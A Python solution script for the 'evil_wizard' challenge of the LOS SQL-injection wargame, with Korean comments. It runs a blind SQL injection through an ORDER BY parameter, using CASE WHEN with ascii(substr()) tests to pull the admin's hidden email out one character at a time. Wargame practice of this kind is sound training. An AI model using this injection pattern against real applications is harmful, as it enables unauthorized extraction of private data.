#LOS evil_wizard

import requests

url ="https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?" #공격URL
cookies ={"PHPSESSID": ""} #쿠키값

#패스워드 길이 찾기
def pw_len():
    len_num = 0

    while 1 :
        len_num = len_num + 1

        value = "(case when (id='admin' and length(email)={}) then id else 'id desc' end)".format(len_num) 
        parmas = {'order':value}
        response = requests.get(url,params=parmas, cookies=cookies)
        print(value)

        if "<tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td><td>**************</td><td>50</td></tr><tr><td>rubiya</td><td>rubiya805@gmail.com</td><td>100</td></tr>" in response.text:    #응답값에 Hello admin이 있으면 반환
            print("password length : ", len_num)
            break

    return len_num



def pw_real(len_num):
    pw=''
    for i in range(1,len_num+1):
        print(i,"번째 검색 중")

       
        for j in range(46, 122):  #아스키코드값 48번부터 122번

            value = "(case when (id='admin' and ascii(substr(email,{},1))={}) then id else 'id desc' end)".format(i,j) #injection payload
            parmas = {'order':value}
            response = requests.get(url, params=parmas, cookies=cookies)

            
            if "<tr><th>id</th><th>email</th><th>score</th><tr><td>admin</td><td>**************</td><td>50</td></tr><tr><td>rubiya</td><td>rubiya805@gmail.com</td><td>100</td></tr>" in response.text:    #응답값에 Hello admin이 있으면 반환
                pw = pw + chr(j)    #chr(): 아스키코드값 -> 문자
                print("password  : ", pw)
                break
    return pw

pw_real(pw_len())
